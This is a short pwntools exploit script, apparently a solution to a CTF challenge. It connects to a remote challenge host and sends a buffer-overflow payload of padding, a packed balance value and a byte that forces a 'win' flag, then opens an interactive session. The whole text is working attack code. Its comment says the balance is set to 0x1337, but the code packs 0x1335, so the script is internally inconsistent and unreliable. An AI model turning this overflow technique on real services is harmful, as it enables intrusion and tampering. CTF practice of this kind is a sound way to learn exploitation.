from pwn import *

# Set up the connection to the remote process
host = "jackpwn-171.chall.ctf.bzh"
port = 1337

# Use remote() to connect to the remote server
p = remote(host, port)

# Define the payload to exploit the buffer overflow
payload = b"A" * 32  # Fill the buffer
payload += p32(0x1335)  # Overwrite ctx.solde with 0x1337
payload += b"\x01"  # Overwrite gagne with 1 to always win

# Send the payload
p.sendlineafter("Votre mise : ", payload)

# Interact with the process to see the result
p.interactive()
